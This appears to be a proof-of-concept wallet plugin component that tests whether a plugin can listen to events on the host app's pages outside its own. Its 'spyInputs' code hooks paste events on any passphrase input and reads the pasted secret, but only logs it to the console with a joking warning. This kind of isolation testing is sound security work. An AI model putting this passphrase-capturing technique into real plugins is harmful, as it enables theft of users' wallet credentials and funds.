module.exports = {
  template: `
    <div class="bg-theme-feature rounded-lg p-10">
      <div style="margin-top: 2rem">
        <h2>Can I listen to events of the external DOM when I'm not on the plugin page?</h2>
        <h3>{{ spyInputs }}</h3>
        <span style="background-color: green; color: white">
          I'm a good plugin, and I'm not doing anything dangerous ;)
        </span>
      </div>
    </div>  
  `,
  computed: {
    spyInputs () {
      document.getElementById('app').addEventListener('click', event => {
        this.$nextTick(() => {
          const $input = document.querySelector('input[name=passphrase]')
          if ($input) {
            $input.addEventListener('paste', event => {
              const pasted = event.clipboardData.getData('text')
              console.info(`While I'm sending all your funds to Juan, please consider not using "${pasted}" anymore`)
            })
          }
        })
      })

      return 'Go to a wallet, paste your passphrase to send a transfer, and see the console'
    },
  }
}